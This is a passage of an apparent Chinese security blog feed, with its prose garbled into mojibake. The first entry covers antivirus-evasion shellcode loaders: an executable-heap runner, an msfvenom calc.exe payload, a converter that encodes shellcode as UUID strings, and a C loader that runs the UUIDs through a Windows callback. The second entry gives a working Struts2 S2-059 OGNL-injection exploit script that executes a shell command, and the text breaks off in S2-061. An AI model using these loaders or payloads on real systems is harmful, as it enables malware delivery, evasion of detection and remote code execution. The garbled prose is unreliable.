title="ä¸¾ä¸€åä¸‰"></a>ä¸¾ä¸€åä¸‰</h2><p>Shellcodeæ‰§è¡Œå…¶å®ä¹Ÿéœ€è¦ä¸€ä¸ªå¯æ‰§è¡Œçš„å†…å­˜é¡µï¼Œé‚£ä¹ˆè¿˜æœ‰å“ªäº›APIèƒ½å¤Ÿæ„é€ ä¸€ä¸ªå¯æ‰§è¡Œçš„å†…å­˜é¡µå‘¢ï¼Ÿ</p><p><code>HeapCreate</code>å¯ä»¥åœ¨è¿›ç¨‹ä¸­åˆ›å»ºè¾…åŠ©å †æ ˆï¼Œå¹¶ä¸”èƒ½å¤Ÿè®¾ç½®å †æ ˆçš„å±æ€§ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE WINAPI <span class="title">HeapCreate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">__in DWORD flOptions,</span></span></span><br><span class="line"><span class="function"><span class="params">__in SIZE_T dwInitialSize,</span></span></span><br><span class="line"><span class="function"><span class="params">__in SIZE_T dwMaximumSize )</span></span>;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°<code>flOptions</code>ç”¨äºä¿®æ”¹å¦‚ä½•åœ¨å †æ ˆä¸Šæ‰§è¡Œå„ç§æ“ä½œã€‚ ä½ å¯ä»¥è®¾å®š<code>0</code>ã€<code>HEAP_NO_SERIALIZE</code>ã€<code>HEAP_GENERATE_EXCEPTIONS</code>ã€<code>HEAP_CREATE_ENABLE_EXECUTE</code>æˆ–è€…æ˜¯è¿™äº›æ ‡å¿—çš„ç»„åˆã€‚</p><ul><li><code>HEAP_NO_SERIALIZE</code>ï¼šå¯¹å †çš„è®¿é—®æ˜¯éç‹¬å çš„ï¼Œå¦‚æœä¸€ä¸ªçº¿ç¨‹æ²¡æœ‰å®Œæˆå¯¹å †çš„æ“ä½œï¼Œå…¶å®ƒçº¿ç¨‹ä¹Ÿå¯ä»¥è¿›ç¨‹å †æ“ä½œï¼Œè¿™ä¸ªå¼€å…³æ˜¯éå¸¸å±é™©çš„ï¼Œåº”å°½é‡é¿å…ä½¿ç”¨ã€‚</li><li><code>HEAP_GENERATE_EXCEPTIONS</code>ï¼šå½“å †åˆ†é…å†…å­˜å¤±è´¥æ—¶ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ã€‚å¦‚æœä¸è®¾ç½®ï¼Œåˆ™è¿”å›NULLã€‚</li><li><code>HEAP_CREATE_ENALBE_EXECUTE</code>ï¼šå †ä¸­å­˜æ”¾çš„å†…å®¹æ˜¯å¯ä»¥æ‰§è¡Œçš„ä»£ç ã€‚å¦‚æœä¸è®¾ç½®ï¼Œæ„å‘³ç€å †ä¸­å­˜æ”¾çš„æ˜¯ä¸å¯æ‰§è¡Œçš„æ•°æ®ã€‚</li></ul><p>çœ‹åˆ°<code>HEAP_CREATE_ENALBE_EXECUTE</code>ç›¸ä¿¡å¾ˆå¤šäººèƒ½å¤Ÿæç„¶å¤§æ‚Ÿï¼Œæˆ‘ä»¬çš„Shellcodeå¯ä»¥å­˜å…¥è¿™ä¸ªè¾…åŠ©å †æ ˆä¸­ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªçº¿ç¨‹è¿è¡Œå®ƒå³å¯ã€‚</p><h2 id="Shellcode-æ‰§è¡Œ"><a href="#Shellcode-æ‰§è¡Œ" class="headerlink" title="Shellcode æ‰§è¡Œ"></a>Shellcode æ‰§è¡Œ</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">PVOID Mptr = HeapAlloc(hHep, <span class="number">0</span>, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">RtlCopyMemory(Mptr, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)Mptr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello World!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç¬¬åè¯¾"><a href="#ç¬¬åè¯¾" class="headerlink" title="ç¬¬åè¯¾"></a>ç¬¬åè¯¾</h1><h2 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h2><p>é€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆuniversally unique identifier, UUIDï¼‰æ˜¯ä¸€ä¸ª128ä½çš„ç”¨äºåœ¨è®¡ç®—æœºç³»ç»Ÿä¸­ä»¥è¯†åˆ«ä¿¡æ¯çš„æ•°ç›®ã€‚åœ¨Windowsä¸­ä¹Ÿæœ‰ä½¿ç”¨GUIDæ¥æ ‡è¯†å”¯ä¸€å¯¹è±¡ã€‚ </p><p>Windowsä¸­çš„GUID ç­‰åŒäº UUID, å…¶ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GUID</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  Data1; <span class="comment">// 4å­—èŠ‚</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> Data2; <span class="comment">// 2å­—èŠ‚</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> Data3; <span class="comment">// 2å­—èŠ‚</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>  Data4[<span class="number">8</span>]; <span class="comment">// 8å­—èŠ‚</span></span><br><span class="line">&#125; GUID;</span><br></pre></td></tr></table></figure><p>æ€»å’Œä¸€å…±16å­—èŠ‚ï¼Œ16*8 = 128ä½ã€‚</p><h2 id="ä¸uuid-ç›¸å…³çš„Windows-API"><a href="#ä¸uuid-ç›¸å…³çš„Windows-API" class="headerlink" title="ä¸uuid ç›¸å…³çš„Windows API"></a>ä¸uuid ç›¸å…³çš„Windows API</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RPC_STATUS <span class="title">UuidFromString</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  RPC_CSTR StringUuid,</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID     *Uuid</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½ï¼šå°†å­—ç¬¦ä¸²uuidè½¬æ¢ä¸ºuuidç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RPC_STATUS <span class="title">UuidCreate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID *Uuid</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½ï¼šåˆ›å»ºUUIDç»“æ„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">UuidEqual</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID       *Uuid1,</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID       *Uuid2,</span></span></span><br><span class="line"><span class="function"><span class="params">  RPC_STATUS *Status</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½ï¼šåˆ¤æ–­ä¸¤ä¸ªUUIDæ˜¯å¦ç›¸ç­‰ã€‚</p><p>UUID ä»£è¡¨äº† -&gt; <code>typedef GUID UUID;</code></p><h2 id="uuid-æµ‹è¯•"><a href="#uuid-æµ‹è¯•" class="headerlink" title="uuid æµ‹è¯•"></a>uuid æµ‹è¯•</h2><p>ç”Ÿæˆ shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;msfvenom -p windows&#x2F;exec CMD&#x3D;calc.exe -b &#39;\xfc\xe8&#39; -f raw -o &#x2F;tmp&#x2F;shellcode.bin</span><br></pre></td></tr></table></figure><p>bin2uuid</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> UUID</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage: python3 binToUUIDs.py shellcode.bin [--print]</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  ____  _    _______    _    _ _    _ _____ _____       </span></span><br><span class="line"><span class="string"> |  _ \(_)  |__   __|  | |  | | |  | |_   _|  __ \      </span></span><br><span class="line"><span class="string"> | |_) |_ _ __ | | ___ | |  | | |  | | | | | |  | |___  </span></span><br><span class="line"><span class="string"> |  _ &lt;| | &#x27;_ \| |/ _ \| |  | | |  | | | | | |  | / __| </span></span><br><span class="line"><span class="string"> | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \__ \ </span></span><br><span class="line"><span class="string"> |____/|_|_| |_|_|\___/ \____/ \____/|_____|_____/|___/</span></span><br><span class="line"><span class="string">\n&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">2</span>] == <span class="string">&quot;--print&quot;</span>:</span><br><span class="line">    outputMapping = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    outputMapping = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Length of shellcode: &#123;&#125; bytes\n&quot;</span>.format(len(bin)))</span><br><span class="line"></span><br><span class="line">out = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(offset &lt; len(bin)):</span><br><span class="line">    countOfBytesToConvert = len(bin[offset:])</span><br><span class="line">    <span class="keyword">if</span> countOfBytesToConvert &lt; <span class="number">16</span>:</span><br><span class="line">        ZerosToAdd = <span class="number">16</span> - countOfBytesToConvert</span><br><span class="line">        byteString = bin[offset:] + (<span class="string">b&#x27;\x00&#x27;</span>* ZerosToAdd)</span><br><span class="line">        uuid = UUID(bytes_le=byteString)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        byteString = bin[offset:offset+<span class="number">16</span>]</span><br><span class="line">        uuid = UUID(bytes_le=byteString)</span><br><span class="line">    offset+=<span class="number">16</span></span><br><span class="line"></span><br><span class="line">    out += <span class="string">&quot;\&quot;&#123;&#125;\&quot;,\n&quot;</span>.format(uuid)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> outputMapping:</span><br><span class="line">        print(<span class="string">&quot;&#123;&#125; -&gt; &#123;&#125;&quot;</span>.format(byteString, uuid))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>] + <span class="string">&quot;UUIDs&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(out)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Outputted to: &#123;&#125;&quot;</span>.format(sys.argv[<span class="number">1</span>] + <span class="string">&quot;UUIDs&quot;</span>))</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆæµ‹è¯•æ ·æœ¬</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * buf[] = &#123;</span><br><span class="line"><span class="string">&quot;4baf01bd-dbdd-d9de-7424-f45a33c9b131&quot;</span>,</span><br><span class="line"><span class="string">&quot;83136a31-04c2-6a03-0e4d-be21f81341da&quot;</span>,</span><br><span class="line"><span class="string">&quot;3fcb73f8-b3c9-34af-7904-bb1975efe989&quot;</span>,</span><br><span class="line"><span class="string">&quot;bd259d0e-28a7-f010-3800-6093ba5bb573&quot;</span>,</span><br><span class="line"><span class="string">&quot;72c89383-cec4-2621-9d85-94d7aad02453&quot;</span>,</span><br><span class="line"><span class="string">&quot;802cf5e0-f4b0-171d-cbae-bd9918dbf781&quot;</span>,</span><br><span class="line"><span class="string">&quot;394ee67d-9cb5-eb50-845d-fed229acfe13&quot;</span>,</span><br><span class="line"><span class="string">&quot;6a754f8d-f2ee-a98e-8d28-1a2a35babc96&quot;</span>,</span><br><span class="line"><span class="string">&quot;5c5a6fc4-c4ca-3a28-cedb-fd30ea500097&quot;</span>,</span><br><span class="line"><span class="string">&quot;3327227b-f020-6246-8c57-76746f07d2fe&quot;</span>,</span><br><span class="line"><span class="string">&quot;5d6f5c9d-a3cb-dbfd-b9a4-fde3edcccc68&quot;</span>,</span><br><span class="line"><span class="string">&quot;bad08a62-64c7-e79b-61ed-4272307075a8&quot;</span>,</span><br><span class="line"><span class="string">&quot;59f68d76-6a06-2be6-0336-a0c0792745e7&quot;</span>,</span><br><span class="line"><span class="string">&quot;844c482e-dab1-650c-545b-b67900000000&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dwNum = <span class="keyword">sizeof</span>(buf) / <span class="keyword">sizeof</span>(buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hMemory == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">PVOID pMemory = HeapAlloc(hMemory, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">DWORD_PTR CodePtr = (DWORD_PTR)pMemory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; dwNum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (CodePtr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">RPC_STATUSstatus = UuidFromStringA(RPC_CSTR(buf[i]), (UUID*)CodePtr);</span><br><span class="line"><span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">CodePtr += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pMemory == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)pMemory, LGRPID_INSTALLED, <span class="literal">NULL</span>) == FALSE) &#123;</span><br><span class="line"><span class="comment">// åŠ è½½æˆåŠŸ</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Windows-CALL-BACK-å‡½æ•°"><a href="#Windows-CALL-BACK-å‡½æ•°" class="headerlink" title="Windows CALL BACK å‡½æ•°"></a>Windows CALL BACK å‡½æ•°</h2><p>CALL BACKæ„ä¸ºå›è°ƒï¼Œæ˜¯å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”±ç³»ç»ŸæŸä¸ªäº‹ä»¶æˆ–ç”¨æˆ·çš„åŠ¨ä½œè‡ªåŠ¨è§¦å‘çš„å‡½æ•°ï¼Œå› æ­¤è°ƒç”¨è€…ä¸æ˜¯ç”¨æˆ·ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HINTERNET hOpen;                       <span class="comment">// Root HINTERNET handle</span></span><br><span class="line">INTERNET_STATUS_CALLBACK iscCallback;  <span class="comment">// Holds the callback function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the root HINTERNET handle.</span></span><br><span class="line">hOpen = InternetOpen( TEXT(<span class="string">&quot;Test Application&quot;</span>),</span><br><span class="line">                      INTERNET_OPEN_TYPE_PRECONFIG,</span><br><span class="line">                      <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the status callback function.</span></span><br><span class="line">iscCallback = InternetSetStatusCallback( hOpen, (INTERNET_STATUS_CALLBACK)CallMaster );</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> CALLBACK <span class="title">CallMaster</span><span class="params">( HINTERNET,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD_PTR,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚æœCallMasteræŒ‡å‘çš„æ˜¯ä¸€å—å¯æ‰§è¡Œå±æ€§çš„å†…å­˜ï¼Œé‚£ä¹ˆå°±å¯ä»¥åŠ è½½Shellcodeã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å¦‚æœçœŸè¦èµ°çº¢é˜Ÿå…æ€è¿™å—ï¼ŒWindows æ ¸å¿ƒç¼–ç¨‹ã€Windows æ“ä½œç³»ç»Ÿç›¸å…³çš„ä¸œè¥¿é‚£å¿…é¡»éå¸¸ç†Ÿç»ƒæ‰è¡Œã€‚</p><p>è·¯æ¼«æ¼«â€¦â€¦ä¸è¦æ€¥äºæ±‚æˆâ€¦â€¦</p><p>ä»£ç éƒ½æ²¡æœ‰æœ¬åœ°æµ‹è¯•ï¼Œåªæ˜¯å…ˆäº†è§£äº†ä¸€ä¸‹å¸¸è§çš„æ–¹æ³•ã€‚æ˜å¤©æˆ–è€…æœ‰ç©ºäº†åœ¨è™šæ‹Ÿæœºé‡Œé¢ç”¨vsæµ‹è¯•ã€‚macç‰ˆçš„vsæ²¡æ³•ç¼–è¯‘c/c++ã€‚clion ä¹Ÿæ²¡æœ‰ï¼Œæ²¡æœ‰ windows.h è¿™ä¸ªå¤´æ–‡ä»¶ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220232131.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;äº†è§£äº†è§£&lt;/p&gt;</summary>
    
    
    
    
    <category term="çº¢è“å¯¹æŠ—" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>æ¼æ´å¤ç°ï¼šS2-059&amp;061è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2019-0230&amp;CVE-2020-17430)</title>
    <link href="https://hack-for.fun/9316.html"/>
    <id>https://hack-for.fun/9316.html</id>
    <published>2021-02-17T16:45:37.000Z</published>
    <updated>2021-02-18T02:32:37.278Z</updated>
    
    <content type="html"><![CDATA[<p>Struts2çš„æ´ä¸€èˆ¬éƒ½æ˜¯OGNLè¡¨è¾¾å¼æ³¨å…¥ï¼Œä»¥åŠå¯¹å…¶æ²™ç›’ç»•è¿‡</p><a id="more"></a><h1 id="S2-059"><a href="#S2-059" class="headerlink" title="S2-059"></a>S2-059</h1><p>Apache Strutsæ¡†æ¶, ä¼šå¯¹æŸäº›ç‰¹å®šçš„æ ‡ç­¾çš„å±æ€§å€¼ï¼Œæ¯”å¦‚idå±æ€§è¿›è¡Œ<strong>äºŒæ¬¡è§£æ</strong>ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥ä¼ é€’å°†åœ¨å‘ˆç°æ ‡ç­¾å±æ€§æ—¶å†æ¬¡è§£æçš„OGNLè¡¨è¾¾å¼ï¼Œé€ æˆOGNLè¡¨è¾¾å¼æ³¨å…¥ã€‚ä»è€Œå¯èƒ½é€ æˆè¿œç¨‹æ‰§è¡Œä»£ç ã€‚</p><p>å½±å“ç‰ˆæœ¬: Struts 2.0.0 - Struts 2.5.20</p><p>é˜¿é‡Œäº‘VPS ä¼šè‡ªå¸¦é˜¿é‡Œäº‘ç›¾ï¼Œæ‰€ä»¥æ¯ä¸€å°é˜¿é‡Œäº‘VPSï¼Œéƒ½æ˜¯é˜¿é‡Œäº‘çš„èœœç½äº†ä¹ˆã€‚ã€‚è‡ªå·±å¤ç°éƒ½ä¹ˆæ³•ï¼Œè‡ªå·±æŠŠè‡ªå·±wafäº†ï¼Œç½‘ç«™éƒ½æ‰“ä¸å¼€ã€‚</p><p>è®¿é—® <code>http://your-ip:8080/?id=%25%7B233*233%7D</code>ï¼Œå¯ä»¥å‘ç°233*233çš„ç»“æœè¢«è§£æåˆ°äº†idå±æ€§ä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;touch /tmp/success&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"><span class="comment"># print(res1.text)</span></span><br><span class="line">res2 = requests.post(url, data=data2)</span><br><span class="line"><span class="comment"># print(res2.text)</span></span><br></pre></td></tr></table></figure><h1 id="S2-061"><a href="#S2-061" class="headerlink" title="S2-061"></a>S2-061</h1><h2 id="å¤ç°ç¯å¢ƒ"><a href="#å¤ç°ç¯å¢ƒ" class="headerlink" title="å¤ç°ç¯å¢ƒ"></a>å¤ç°ç¯å¢ƒ</h2><p>Vulhub:</p><p><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-061">https://github.com/vulhub/vulhub/tree/master/struts2/s2-061</a></p><p>Struts2: </p><p>2.5.25 </p><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>æ­¤æ¬¡æ¼æ´åªæ˜¯S2-059ä¿®å¤çš„ä¸€ä¸ªç»•è¿‡ï¼Œå¹¶ä¸”æœ¬æ¬¡åˆ©ç”¨çš„æ 